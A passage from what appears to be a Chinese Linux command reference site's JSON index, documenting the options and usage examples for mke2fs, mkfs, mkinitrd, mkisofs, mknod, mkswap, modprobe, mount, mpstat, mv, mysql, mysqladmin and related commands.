选项\n\n```shell\n-b<区块大小>：指定区块大小，单位为字节；\n-c；检查是否有损坏的区块；\n-f<不连续区段大小>：指定不连续区段的大小，单位为字节；\n-F：不管指定的设备为何，强制执行mke2fs；\n-i<字节>：指定\"字节/inode\"的比例；\n-N<inode数>：指定要建立的inode数目；\n-l<文件>：从指定的文件中，读取文件西中损坏区块的信息；\n-L<标签>：设置文件系统的标签名称；\n-m<百分比值>：指定给管理员保留区块的比例，预设为5%；\n-M：记录最后一次挂入的目录；\n-q：执行时不显示任何信息；\n-r：指定要建立的ext2文件系统版本；\n-R=<区块数>：设置磁盘阵列参数；\n-S：仅写入superblock与group descriptors，而不更改inode able inode bitmap以及block bitmap；\n-v：执行时显示详细信息；\n-V：显示版本信息。\n```\n\n###  参数\n\n*   设备文件：指定要创建的文件系统的分区设备文件名；\n*   块数：指定要创建的文件系统的磁盘块数量。\n\n###  实例\n\n创建指定的ext2文件系统。\n\n```shell\nmke2fs -q /dev/hda1\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","mke2fs"]},{"title":"【Linux 命令】mkfs","url":"/linux-command/mkfs/","content":"\n用于在设备上创建Linux文件系统\n\n## 补充说明\n\n**mkfs命令** 用于在设备上（通常为硬盘）创建Linux文件系统。mkfs本身并不执行建立文件系统的工作，而是去调用相关的程序来执行。\n\n###  语法\n\n```shell\nmkfs(选项)(参数)\n```\n\n###  选项\n\n```shell\nfs：指定建立文件系统时的参数；\n-t<文件系统类型>：指定要建立何种文件系统；\n-v：显示版本信息与详细的使用方法；\n-V：显示简要的使用方法；\n-c：在制做档案系统前，检查该partition是否有坏轨。\n```\n\n###  参数\n\n*   文件系统：指定要创建的文件系统对应的设备文件名；\n*   块数：指定文件系统的磁盘块数。\n\n###  实例\n\n在`/dev/hda5`上建一个msdos的档案系统，同时检查是否有坏轨存在，并且将过程详细列出来：\n\n```shell\nmkfs -V -t msdos -c /dev/hda5\n\nmkfs -t ext3 /dev/sda6     //将sda6分区格式化为ext3格式\nmkfs -t ext2 /dev/sda7     //将sda7分区格式化为ext2格式\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","mkfs"]},{"title":"【Linux 命令】mkinitrd","url":"/linux-command/mkinitrd/","content":"\n建立要载入ramdisk的映像文件\n\n## 补充说明\n\n**mkinitrd命令** 建立要载入ramdisk的映像文件，以供Linux开机时载入ramdisk。\n\n这个是重新封包核心的命令，例如你自己修改了一个设备的驱动，如果这个驱动要加入核心级别的话，就需要对核心进行重新封包，把新加的配置编译到核心内部去！\n\n###  语法\n\n```shell\nmkinitrd(选项)(参数)\n```\n\n###  选项\n\n```shell\n-f：若指定的映像问家名称与现有文件重复，则覆盖现有的文件；\n-v：执行时显示详细的信息；\n--omit-scsi-modules：不要载入SCSI模块；\n--preload=<模块名称>：指定要载入的模块；\n--with=<模块名称>：指定要载入的模块；\n--version：显示版本信息。\n```\n\n###  参数\n\n*   映像文件：指定要创建的映像文件；\n*   内核版本：指定内核版本。\n\n###  实例\n\n```shell\n[root@localhost tmp]# mkinitrd -v -f myinitrd.img $(uname -r)\nCreating initramfs\nWARNING: using /tmp for temporary files\nLooking for deps of module ide-disk\nLooking for deps of module ext3  jbd\nLooking for deps of module jbd\nUsing modules:  ./kernel/fs/jbd/jbd.ko ./kernel/fs/ext3/ext3.ko\n/sbin/nash -> /tmp/initrd.Vz3928/bin/nash\n/sbin/insmod.static -> /tmp/initrd.Vz3928/bin/insmod\n/sbin/udev.static -> /tmp/initrd.Vz3928/sbin/udev\n/etc/udev/udev.conf -> /tmp/initrd.Vz3928/etc/udev/udev.conf\ncopy from /lib/modules/2.6.9-5.EL/./kernel/fs/jbd/jbd.ko(elf32-i386) to /tmp/initrd.Vz3928/lib/jbd.ko(elf32-i386)\ncopy from /lib/modules/2.6.9-5.EL/./kernel/fs/ext3/ext3.ko(elf32-i386) to /tmp/initrd.Vz3928/lib/ext3.ko(elf32-i386)\nLoading module jbd\nLoading module ext3\n\n[root@localhost tmp]# file myinitrd.img\nmyinitrd.img: gzip compressed data, from Unix, max compression\n\n[root@localhost tmp]# mv myinitrd.img  myinitrd.img.gz\n[root@localhost tmp]# gzip -d myinitrd.img.gz\n[root@localhost tmp]# file myinitrd.img\nmyinitrd.img: ASCII cpio archive (SVR4 with no CRC)\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","mkinitrd"]},{"title":"【Linux 命令】mkisofs","url":"/linux-command/mkisofs/","content":"\n建立ISO 9660映像文件\n\n## 补充说明\n\n**mkisofs命令** 用来将指定的目录与文件做成ISO 9660格式的映像文件，以供刻录光盘。\n\n###  语法\n\n```shell\nmkisofs(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a或--all：mkisofs通常不处理备份文件。使用此参数可以把备份文件加到映像文件中；\n-A<应用程序id>或-appid<应用程序ID>：指定光盘的应用程序ID；\n-abstract<摘要文件>：指定摘要文件的文件名；\n-b<开机映像文件>或-eltorito-boot<开机映像文件>：指定在制作可开机光盘时所需的开机映像文件；\n-biblio<ISBN文件>：指定ISBN文件的文件名，ISBN文件位于光盘根目录下，记录光盘的ISBN；\n-c<开机文件名称>：制作可开机光盘时，mkisofs会将开机映像文件中的全-eltorito-catalog<开机文件名称>全部内容作成一个文件；\n-C<盘区编号，盘区编号>：将许多节区合成一个映像文件时，必须使用此参数；\n-copyright<版权信息文件>：指定版权信息文件的文件名；\n-d或-omit-period：省略文件后的句号；\n-D或-disable-deep-relocation：ISO 9660最多只能处理8层的目录，超过8层的部分，RRIP会自动将它们设置成ISO 9660兼容的格式。使用-D参数可关闭此功能；\n-f或-follow-links：忽略符号连接；\n-h：显示帮助；\n-hide<目录或文件名>：使指定的目录或文件在ISO 9660或Rock RidgeExtensions的系统中隐藏；\n-hide-joliet<目录或文件名>：使指定的目录或文件在Joliet系统中隐藏；\n-J或-joliet：使用Joliet格式的目录与文件名称；\n-l或-full-iso9660-filenames：使用ISO 9660 32字符长度的文件名；\n-L或-allow-leading-dots：允许文件名的第一个字符为句号；\n-log-file<记录文件>：在执行过程中若有错误信息，预设会显示在屏幕上；\n-m<目录或文件名>或-exclude<目录或文件名>：指定的目录或文件名将不会房入映像文件中；\n-M<映像文件>或-prev-session<映像文件>：与指定的映像文件合并；\n-N或-omit-version-number：省略ISO 9660文件中的版本信息；\n-o<映像文件>或-output<映像文件>：指定映像文件的名称；\n-p<数据处理人>或-preparer<数据处理人>：记录光盘的数据处理人；\n-print-size：显示预估的文件系统大小；\n-quiet：执行时不显示任何信息；\n-r或-rational-rock：使用Rock Ridge Extensions，并开放全部文件的读取权限；\n-R或-rock：使用Rock Ridge Extensions；\n-sysid<系统ID>：指定光盘的系统ID；\n-T或-translation-table：建立文件名的转换表，适用于不支持Rock Ridge Extensions的系统上；\n-v或-verbose：执行时显示详细的信息；\n-V<光盘ID>或-volid<光盘ID>：指定光盘的卷册集ID；\n-volset-size<光盘总数>：指定卷册集所包含的光盘张数；\n-volset-seqno<卷册序号>：指定光盘片在卷册集中的编号；\n-x<目录>：指定的目录将不会放入映像文件中；\n-z：建立通透性压缩文件的SUSP记录，此记录目前只在Alpha机器上的Linux有效。\n```\n\n###  参数\n\n路径：需要添加到映像文件中的路径。\n\n###  实例\n\nlinux中用mkisofs命令把文件制作成ISO步骤：\n\n把NFS服务器上的目录挂载到本地/mnt/nfs/的目录：\n\n```shell\nmount -t nfs 10.0.2.2:/linuxos/rhel4.0_update3/ /mnt/nfs/\n```\n\n把已挂载的文件复制到本地：\n\n```shell\ncp -a /mnt/NFS/* /root/Decp -a /mnt/nfs/* /root/Desktop/rhel4.0/&sktop/rhel4.0/&\n```\n\n查找boot.cat文件并删除掉：\n\n```shell\nfind rhel4.0/ -name boot.cat | xargs rm\n```\n\n查找TRANS.TBL文件并删除掉：\n\n```shell\nfind rhel4.0/ -name TRANS.TBL -exec rm {} \\;\n```\n\n复制本地的所需文件到指定目录：\n\n```shell\ncp /usr/share/comps/i386/.discinfo rhel4.0/\n```\n\n把指定目录下的所有文件制作成ISO文件：\n\n```shell\nmkisofs -R -J -T -v -no-emul-boot -boot-load-size 4 -boot-info-table -V RHEL4ASDVD -b isolinux/isolinux.bin -c isolinux/boot.cat -o /RHEL4AS.iso rhel4.0/\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","mkisofs"]},{"title":"【Linux 命令】mknod","url":"/linux-command/mknod/","content":"\n创建字符设备文件和块设备文件\n\n## 补充说明\n\n**mknod命令** 用于创建Linux中的字符设备文件和块设备文件。\n\n###  语法\n\n```shell\nmknod(选项)(参数)\n```\n\n###  选项\n\n```shell\n-Z：设置安全的上下文；\n-m：设置权限模式；\n-help：显示帮助信息；\n--version：显示版本信息。\n```\n\n###  参数\n\n*   文件名：要创建的设备文件名；\n*   类型：指定要创建的设备文件的类型；\n*   主设备号：指定设备文件的主设备号；\n*   次设备号：指定设备文件的次设备号。\n\n###  实例\n\n```shell\nls -la /dev/ttyUSB*\ncrw-rw—- 1 root dialout 188, 0 2008-02-13 18:32 /dev/ttyUSB0\nmknod /dev/ttyUSB32 c 188 32\n```\n\n###  扩展知识\n\nLinux的设备管理是和文件系统紧密结合的，各种设备都以文件的形式存放在/dev目录 下，称为设备文件。应用程序可以打开、关闭和读写这些设备文件，完成对设备的操作，就像操作普通的数据文件一样。\n\n为了管理这些设备，系统为设备编了号，每 个设备号又分为主设备号和次设备号。主设备号用来区分不同种类的设备，而次设备号用来区分同一类型的多个设备。对于常用设备，Linux有约定俗成的编 号，如硬盘的主设备号是3。\n\nLinux为所有的设备文件都提供了统一的操作函数接口，方法是使用数据结构struct file_operations。这个数据结构中包括许多操作函数的指针，如open()、close()、read()和write()等，但由于外设 的种类较多，操作方式各不相同。Struct file_operations结构体中的成员为一系列的接口函数，如用于读/写的read/write函数和用于控制的ioctl等。\n\n打开一个文件就是调用这个文件file_operations中的open操作。不同类型的文件有不同的file_operations成员函数，如普通的磁盘数据文件， 接口函数完成磁盘数据块读写操作；而对于各种设备文件，则最终调用各自驱动程序中的I/O函数进行具体设备的操作。这样，应用程序根本不必考虑操作的是设 备还是普通文件，可一律当作文件处理，具有非常清晰统一的I/O接口。所以file_operations是文件层次的I/O接口。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","mknod"]},{"title":"【Linux 命令】mkswap","url":"/linux-command/mkswap/","content":"\n建立和设置SWAP交换分区\n\n## 补充说明\n\n**mkswap命令** 用于在一个文件或者设备上建立交换分区。在建立完之后要使用sawpon命令开始使用这个交换区。最后一个选择性参数指定了交换区的大小，但是这个参数是为了向后兼容设置的，没有使用的必要，一般都将整个文件或者设备作为交换区。\n\n###  语法\n\n```shell\nmkswap(选项)(参数)\n```\n\n###  选项\n\n```shell\n-c：建立交换区前，先检查是否有损坏的区块；\n-f：在SPARC电脑上建立交换区时，要加上此参数；\n-v0：建立旧式交换区，此为预设值；\n-v1：建立新式交换区。\n```\n\n###  参数\n\n设备：指定交换空间对应的设备文件或者交换文件。\n\n###  实例\n\n **查看系统swap space大小：** \n\n```shell\nfree -m\ntotal used free shared buffers cached\nMem: 377 180 197 0 19 110\n-/+ buffers/cache: 50 327\nSwap: 572 0 572\n```\n\n **查看当前的swap空间(file(s)/partition(s))：** \n\n```shell\nswapon -s\n\n等价于\n\ncat /proc/swaps\n```\n\n **添加交换空间** \n\n添加一个 **交换分区** 或添加一个 **交换文件** 。推荐你添加一个交换分区；不过，若你没有多少空闲空间可用，则添加交换文件。\n\n添加一个交换分区，步骤如下：\n\n使用fdisk来创建交换分区（假设 /dev/sdb2 是创建的交换分区），使用 mkswap 命令来设置交换分区：\n\n```shell\nmkswap /dev/sdb2\n```\n\n启用交换分区：\n\n```shell\nswapon /dev/sdb2\n```\n\n写入`/etc/fstab`，以便在引导时启用：\n\n```shell\n/dev/sdb2 swap swap defaults 0 0\n```\n\n添加一个交换文件，步骤如下：\n\n创建大小为512M的交换文件：\n\n```shell\ndd if=/dev/zero of=/swapfile1 bs=1024 count=524288\n```\n\n使用mkswap命令来设置交换文件：\n\n```shell\nmkswap /swapfile1\n```\n\n启用交换分区：\n\n```shell\nswapon /swapfile1\n```\n\n写入`/etc/fstab`，以便在引导时启用：\n\n```shell\n/swapfile1 swap swap defaults 0 0\n```\n\n新添了交换分区并启用它之后，请查看`cat /proc/swaps`或free命令的输出来确保交换分区已被启用了。\n\n **删除交换空间：** \n\n禁用交换分区：\n\n```shell\nswapoff /dev/sdb2\n```\n\n从`/etc/fstab`中删除项目，使用fdisk或yast工具删除分区。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","mkswap"]},{"title":"【Linux 命令】mktemp","url":"/linux-command/mktemp/","content":"\n创建临时文件供shell脚本使用\n\n## 补充说明\n\n**mktemp命令** 被用来创建临时文件供shell脚本使用。\n\n###  语法\n\n```shell\nmktemp(选项)(参数)\n```\n\n###  选项\n\n```shell\n-q：执行时若发生错误，不会显示任何信息；\n-u：暂存文件会在mktemp结束前先行删除；\n-d：创建一个目录而非文件。\n```\n\n###  参数\n\n文件：指定创建的临时文件。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","mktemp"]},{"title":"【Linux 命令】modprobe","url":"/linux-command/modprobe/","content":"\n自动处理可载入模块\n\n## 补充说明\n\n**modprobe命令** 用于智能地向内核中加载模块或者从内核中移除模块。\n\nmodprobe可载入指定的个别模块，或是载入一组相依的模块。modprobe会根据depmod所产生的相依关系，决定要载入哪些模块。若在载入过程中发生错误，在modprobe会卸载整组的模块。\n\n###  语法 \n\n```shell\nmodprobe(选项)(参数)\n```\n\n###  选项 \n\n```shell\n-a或--all：载入全部的模块；\n-c或--show-conf：显示所有模块的设置信息；\n-d或--debug：使用排错模式；\n-l或--list：显示可用的模块；\n-r或--remove：模块闲置不用时，即自动卸载模块；\n-t或--type：指定模块类型；\n-v或--verbose：执行时显示详细的信息；\n-V或--version：显示版本信息；\n-help：显示帮助。\n```\n\n###  参数 \n\n模块名：要加载或移除的模块名称。\n\n###  实例 \n\n **查看modules的配置文件：** \n\n```shell\nmodprobe -c\n```\n\n这里，可以查看modules的配置文件，比如模块的alias别名是什么等。会打印许多行信息，例如其中的一行会类似如下：\n\n```shell\nalias symbol:ip_conntrack_unregister_notifier ip_conntrack\n```\n\n **列出内核中所有已经或者未挂载的所有模块：** \n\n```shell\nmodprobe -l\n```\n\n这里，我们能查看到我们所需要的模块，然后根据我们的需要来挂载；其实`modprobe -l`读取的模块列表就位于/lib/modules/\\`uname -r \\`目录中；其中`uname -r`是内核的版本，例如输出结果的其中一行是：\n\n```shell\n/lib/modules/2.6.18-348.6.1.el5/kernel/net/netfilter/xt_statistic.ko\n```\n\n **挂载vfat模块：** \n\n```shell\nmodprobe vfat\n```\n\n这里，使用格式`modprobe 模块名`来挂载一个模块。挂载之后，用lsmod可以查看已经挂载的模块。模块名是不能带有后缀的，我们通过`modprobe -l`所看到的模块，都是带有`.ko`或`.o`后缀。\n\n **移除已经加载的模块：** \n\n```shell\nmodprobe -r 模块名\n```\n\n这里，移除已加载的模块，和rmmod功能相同。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","modprobe"]},{"title":"【Linux 命令】more","url":"/linux-command/more/","content":"\n显示文件内容，每次显示一屏\n\n## 补充说明\n\n**more命令** 是一个基于vi编辑器文本过滤器，它以全屏幕的方式按页显示文本文件的内容，支持vi中的关键字定位操作。more名单中内置了若干快捷键，常用的有H（获得帮助信息），Enter（向下翻滚一行），空格（向下滚动一屏），Q（退出命令）。\n\n该命令一次显示一屏文本，满屏后停下来，并且在屏幕的底部出现一个提示信息，给出至今己显示的该文件的百分比：--More--（XX%）可以用下列不同的方法对提示做出回答：\n\n*   按 `Space` 键：显示文本的下一屏内容。\n*   按 `Enter` 键：只显示文本的下一行内容。\n*   按斜线符`|`：接着输入一个模式，可以在文本中寻找下一个相匹配的模式。\n*   按H键：显示帮助屏，该屏上有相关的帮助信息。\n*   按B键：显示上一屏内容。\n*   按Q键：退出more命令。\n\n###  语法\n\n```shell\nmore(语法)(参数)\n```\n\n###  选项\n\n```shell\n-<数字>：指定每屏显示的行数；\n-d：显示“[press space to continue,'q' to quit.]”和“[Press 'h' for instructions]”；\n-c：不进行滚屏操作。每次刷新这个屏幕；\n-s：将多个空行压缩成一行显示；\n-u：禁止下划线；\n+<数字>：从指定数字的行开始显示。\n```\n\n###  参数\n\n文件：指定分页显示内容的文件。\n\n###  实例\n\n显示文件file的内容，但在显示之前先清屏，并且在屏幕的最下方显示完成的百分比。\n\n```shell\nmore -dc file\n```\n\n显示文件file的内容，每10行显示一次，而且在显示之前先清屏。\n\n```shell\nmore -c -10 file\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","more"]},{"title":"【Linux 命令】mount","url":"/linux-command/mount/","content":"\n用于挂载Linux系统外的文件\n\n## 补充说明\n\n**mount命令** Linux mount命令是经常会使用到的命令，它用于挂载Linux系统外的文件。\n\n###  语法\n\n```shell\nmount [-hV]\nmount -a [-fFnrsvw] [-t vfstype]\nmount [-fnrsvw] [-o options [,...]] device | dir\nmount [-fnrsvw] [-t vfstype] [-o options] device dir\n```\n\n###  选项\n\n```shell\n-V：显示程序版本\n-h：显示辅助讯息\n-v：显示较讯息，通常和 -f 用来除错。\n-a：将 /etc/fstab 中定义的所有档案系统挂上。\n-F：这个命令通常和 -a 一起使用，它会为每一个 mount 的动作产生一个行程负责执行。在系统需要挂上大量 NFS 档案系统时可以加快挂上的动作。\n-f：通常用在除错的用途。它会使 mount 并不执行实际挂上的动作，而是模拟整个挂上的过程。通常会和 -v 一起使用。\n-n：一般而言，mount 在挂上后会在 /etc/mtab 中写入一笔资料。但在系统中没有可写入档案系统存在的情况下可以用这个选项取消这个动作。\n-s-r：等于 -o ro\n-w：等于 -o rw\n-L：将含有特定标签的硬盘分割挂上。\n-U：将档案分割序号为 的档案系统挂下。-L 和 -U 必须在/proc/partition 这种档案存在时才有意义。\n-t：指定档案系统的型态，通常不必指定。mount 会自动选择正确的型态。\n-o async：打开非同步模式，所有的档案读写动作都会用非同步模式执行。\n-o sync：在同步模式下执行。\n-o atime、-o noatime：当 atime 打开时，系统会在每次读取档案时更新档案的『上一次调用时间』。当我们使用 flash 档案系统时可能会选项把这个选项关闭以减少写入的次数。\n-o auto、-o noauto：打开/关闭自动挂上模式。\n-o defaults:使用预设的选项 rw, suid, dev, exec, auto, nouser, and async.\n-o dev、-o nodev-o exec、-o noexec允许执行档被执行。\n-o suid、-o nosuid：\n允许执行档在 root 权限下执行。\n-o user、-o nouser：使用者可以执行 mount/umount 的动作。\n-o remount：将一个已经挂下的档案系统重新用不同的方式挂上。例如原先是唯读的系统，现在用可读写的模式重新挂上。\n-o ro：用唯读模式挂上。\n-o rw：用可读写模式挂上。\n-o loop=：使用 loop 模式用来将一个档案当成硬盘分割挂上系统。\n```\n\n###  实例\n\n将 `/dev/hda1` 挂在 `/mnt` 之下。\n\n```shell\n#mount /dev/hda1 /mnt\n```\n\n将 `/dev/hda1` 用唯读模式挂在 `/mnt` 之下。\n\n```shell\n#mount -o ro /dev/hda1 /mnt\n```\n\n将 `/tmp/image.iso` 这个光碟的 `image` 档使用 `loop` 模式挂在 `/mnt/cdrom` 之下。用这种方法可以将一般网络上可以找到的 `Linux` 光 碟 ISO 档在不烧录成光碟的情况下检视其内容。\n\n```shell\n#mount -o loop /tmp/image.iso /mnt/cdrom\n```\n\n\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","mount"]},{"title":"【Linux 命令】mpstat","url":"/linux-command/mpstat/","content":"\n显示各个可用CPU的状态\n\n## 补充说明\n\n**mpstat命令** 指令主要用于多CPU环境下，它显示各个可用CPU的状态系你想。这些信息存放在`/proc/stat`文件中。在多CPUs系统里，其不但能查看所有CPU的平均状况信息，而且能够查看特定CPU的信息。\n\n###  语法\n\n```shell\nmpstat(选项)(参数)\n```\n\n###  选项\n\n```shell\n-P：指定CPU编号。\n```\n\n###  参数\n\n*   间隔时间：每次报告的间隔时间（秒）；\n*   次数：显示报告的次数。\n\n###  实例\n\n当mpstat不带参数时，输出为从系统启动以来的平均值。\n\n```shell\nmpstat\nLinux 2.6.9-5.31AXsmp (builder.redflag-linux.com) 12/16/2005\n09:38:46 AM CPU %user %nice %system %iowait %irq %soft %idle intr/s\n09:38:48 AM all 23.28 0.00 1.75     0.50 0.00 0.00 74.47 1018.59\n```\n\n **每2秒产生了2个处理器的统计数据报告：** \n\n下面的命令可以每2秒产生了2个处理器的统计数据报告，一共产生三个interval 的信息，然后再给出这三个interval的平均信息。默认时，输出是按照CPU 号排序。第一个行给出了从系统引导以来的所有活跃数据。接下来每行对应一个处理器的活跃状态。。\n\n```shell\nmpstat -P ALL 2 3\nLinux 2.6.18-164.el5 (server.sys.com)    01/04/2010\n09:34:20 PM CPU   %user   %nice    %sys %iowait    %irq   %soft %steal   %idle    intr/s\n09:34:22 PM all    0.00    0.00    0.00    0.00    0.00    0.00    0.00 100.00   1001.49\n09:34:22 PM    0    0.00    0.00    0.50    0.00    0.00    0.00    0.00   99.50   1001.00\n09:34:22 PM    1    0.00    0.00    0.00    0.00    0.00    0.00    0.00 100.00      0.00\n```\n\n **比较带参数和不带参数的mpstat的结果：** \n\n在后台开一个2G的文件\n\n```shell\ncat 1.img &\n```\n\n然后在另一个终端运行mpstat命令\n\n```shell\nmpstat\nLinux 2.6.18-164.el5 (server.sys.com)    01/04/2010\n10:17:31 PM CPU   %user   %nice    %sys %iowait    %irq   %soft %steal   %idle    intr/s\n10:17:31 PM all    0.07    0.02    0.25    0.21    0.01    0.04    0.00   99.40   1004.57\n```\n\n```shell\nmpstat\nLinux 2.6.18-164.el5 (server.sys.com)    01/04/2010\n10:17:35 PM CPU   %user   %nice    %sys %iowait    %irq   %soft %steal   %idle    intr/s\n10:17:35 PM all    0.07    0.02    0.25    0.21    0.01    0.04    0.00   99.39   1004.73\n```\n\n```shell\nmpstat 3 10\nLinux 2.6.18-164.el5 (server.sys.com)    01/04/2010\n10:17:55 PM CPU   %user   %nice    %sys %iowait    %irq   %soft %steal   %idle    intr/s\n10:17:58 PM all   13.12    0.00   20.93    0.00    1.83    9.80    0.00   54.32   2488.08\n10:18:01 PM all   10.82    0.00   19.30    0.83    1.83    9.32    0.00   57.90   2449.83\n10:18:04 PM all   10.95    0.00   20.40    0.17    1.99    8.62    0.00   57.88   2384.05\n10:18:07 PM all   10.47    0.00   18.11    0.00    1.50    8.47    0.00   61.46   2416.00\n10:18:10 PM all   11.81    0.00   22.63    0.00    1.83   11.98    0.00   51.75   2210.60\n10:18:13 PM all    6.31    0.00   10.80    0.00    1.00    5.32    0.00   76.58   1795.33\n10:18:19 PM all    1.75    0.00    3.16    0.75    0.25    1.25    0.00   92.85   1245.18\n10:18:22 PM all   11.94    0.00   19.07    0.00    1.99    8.29    0.00   58.71   2630.46\n10:18:25 PM all   11.65    0.00   19.30    0.50    2.00    9.15    0.00   57.40   2673.91\n10:18:28 PM all   11.44    0.00   21.06    0.33    1.99   10.61    0.00   54.56   2369.87\nAverage:     all    9.27    0.00   16.18    0.30    1.50    7.64    0.00   65.11   2173.54\n```\n\n上两表显示出当要正确反映系统的情况，需要正确使用命令的参数。vmstat 和iostat 也需要注意这一问题。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","mpstat"]},{"title":"【Linux 命令】mtools","url":"/linux-command/mtools/","content":"\n显示mtools支持的指令\n\n## 补充说明\n\n**mtools命令** 显示mtools支持的指令，mtools为MS-DOS文件系统的工具程序，可模拟许多MS-DOS的指令。这些指令都是mtools的符号连接，因此会有一些共同的特性。\n\n###  语法\n\n```shell\nmtools(选项)\n```\n\n###  选项\n\n```shell\n-a：长文件名重复时自动更改目标文件的长文件名；\n-A：短文件名重复但长文件名不同时自动更改目标文件的短文件名；\n-o：长文件名重复时，将目标文件覆盖现有的文件；\n-O：短文件名重复但长文件名不同时，将目标文件覆盖现有的文件；\n-r：长文件名重复时，要求用户更改目标文件的长文件名；\n-R：短文件名重复但长文件名不同时，要求用户更改目标文件的短文件名；\n-s：长文件名重复时，则不处理该目标文件；\n-S：短文件名重复但长文件名不同时，则不处理该目标文件；\n-v：执行时显示详细的说明；\n-V：显示版本信息。\n```\n\n###  实例\n\n使用mtools命令显示其支持的所有的指令，输入如下命令：\n\n```shell\n[root@localhost ~]# mtools     #显示所有支持的指令名称\nSupported commands:\nmattrib, mbadblocks, mcat, mcd, mclasserase, mcopy, mdel, mdeltree\nmdir, mdoctorfat, mdu, mformat, minfo, mlabel, mmd, mmount\nmpartition, mrd, mread, mmove, mren, mshowfat, mtoolstest, mtype\nmwrite, mzip\n```\n\n如上所示，其显示的所有命令均为mtools工具所支持的。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","mtools"]},{"title":"【Linux 命令】mv","url":"/linux-command/mv/","content":"\n用来对文件或目录重新命名\n\n## 补充说明\n\n**mv命令** 用来对文件或目录重新命名，或者将文件从一个目录移到另一个目录中。source表示源文件或目录，target表示目标文件或目录。如果将一个文件移到一个已经存在的目标文件中，则目标文件的内容将被覆盖。\n\nmv命令可以用来将源文件移至一个目标文件中，或将一组文件移至一个目标目录中。源文件被移至目标文件有两种不同的结果：\n\n1.  如果目标文件是到某一目录文件的路径，源文件会被移到此目录下，且文件名不变。\n2.  如果目标文件不是目录文件，则源文件名（只能有一个）会变为此目标文件名，并覆盖己存在的同名文件。如果源文件和目标文件在同一个目录下，mv的作用就是改文件名。当目标文件是目录文件时，源文件或目录参数可以有多个，则所有的源文件都会被移至目标文件中。所有移到该目录下的文件都将保留以前的文件名。\n\n注意事项：mv与cp的结果不同，mv好像文件“搬家”，文件个数并未增加。而cp对文件进行复制，文件个数增加了。\n\n###  语法 \n\n```shell\nmv(选项)(参数)\n```\n\n###  选项 \n\n```shell\n--backup=<备份模式>：若需覆盖文件，则覆盖前先行备份；\n-b：当文件存在时，覆盖前，为其创建一个备份；\n-f：若目标文件或目录与现有的文件或目录重复，则直接覆盖现有的文件或目录；\n-i：交互式操作，覆盖前先行询问用户，如果源文件与目标文件或目标目录中的文件同名，则询问用户是否覆盖目标文件。用户输入”y”，表示将覆盖目标文件；输入”n”，表示取消对源文件的移动。这样可以避免误将文件覆盖。\n--strip-trailing-slashes：删除源文件中的斜杠“/”；\n-S<后缀>：为备份文件指定后缀，而不使用默认的后缀；\n--target-directory=<目录>：指定源文件要移动到目标目录；\n-u：当源文件比目标文件新或者目标文件不存在时，才执行移动操作。\n```\n\n###  参数 \n\n*   源文件：源文件列表。\n*   目标文件：如果“目标文件”是文件名则在移动文件的同时，将其改名为“目标文件”；如果“目标文件”是目录名则将源文件移动到“目标文件”下。\n\n###  实例 \n\n将目录`/usr/men`中的所有文件移到当前目录（用`.`表示）中：\n\n```shell\nmv /usr/men/* .\n```\n\n移动文件\n\n```shell\nmv file_1.txt /home/office/\n```\n\n移动多个文件\n\n```shell\nmv file_2.txt file_3.txt file_4.txt /home/office/\nmv *.txt /home/office/\n```\n\n移动目录\n\n```shell\nmv directory_1/ /home/office/\n```\n\n重命名文件或目录\n\n```shell\nmv file_1.txt file_2.txt # 将文件file_1.txt改名为file_2.txt\n```\n\n重命名目录\n\n```shell\nmv directory_1/ directory_2/\n```\n\n打印移动信息\n\n```shell\nmv -v *.txt /home/office\n```\n\n提示是否覆盖文件\n\n```shell\nmv -i file_1.txt /home/office\n```\n\n源文件比目标文件新时才执行更新\n\n```shell\nmv -uv *.txt /home/office\n```\n\n不要覆盖任何已存在的文件\n\n```shell\nmv -vn *.txt /home/office\n```\n\n复制时创建备份\n\n```shell\nmv -bv *.txt /home/office\n```\n\n无条件覆盖已经存在的文件\n\n```shell\nmv -f *.txt /home/office\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","mv"]},{"title":"【Linux 命令】mysql","url":"/linux-command/mysql/","content":"\nMySQL服务器客户端工具\n\n## 补充说明\n\n**mysql命令** 是MySQL数据库服务器的客户端工具，它工作在命令行终端中，完成对远程MySQL数据库服务器的操作。\n\n###  语法\n\n```shell\nmysql(选项)(参数)\n```\n\n###  选项\n\n```shell\n-h：MySQL服务器的ip地址或主机名；\n-u：连接MySQL服务器的用户名；\n-e：执行mysql内部命令；\n-p：连接MySQL服务器的密码。\n```\n\n###  参数\n\n数据库：指定连接服务器后自动打开的数据库。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","mysql"]},{"title":"【Linux 命令】mysqladmin","url":"/linux-command/mysqladmin/","content":"\nMySQL服务器管理客户端\n\n## 补充说明\n\n**mysqladmin命令** 是mysql服务器管理任务的客户端工具，它可以检查mytsql服务器的配置和当前工作状态，创建和删除数据库，创建用户和修改用户密码等操作。\n\n###  语法\n\n```shell\nmysqladmin(选项)(参数)\n```\n\n###  选项\n\n```shell\n-h：MySQL服务器主机名或ip地址；\n-u：连接MySQL服务器的用户名；\n-p：连接MySQL服务器的密码；\n--help：显示帮助信息。\n```\n\n###  参数\n\n管理命令：需要在MySQL服务器上执行的管理命令。\n\n **mysqladmin支持下列命令：** \n\n```shell\ncreate databasename：创建一个新数据库；\ndrop databasename：删除一个数据库及其所有表；\nextended-status：给出服务器的一个扩展状态消息；\nflush-hosts：清空所有缓存的主机；\nflush-logs：清空所有日志；\nflush-tables：清空所有表；\nflush-privileges：再次装载授权表(同reload)；\nkill id,id,...：杀死mysql线程；\npassword 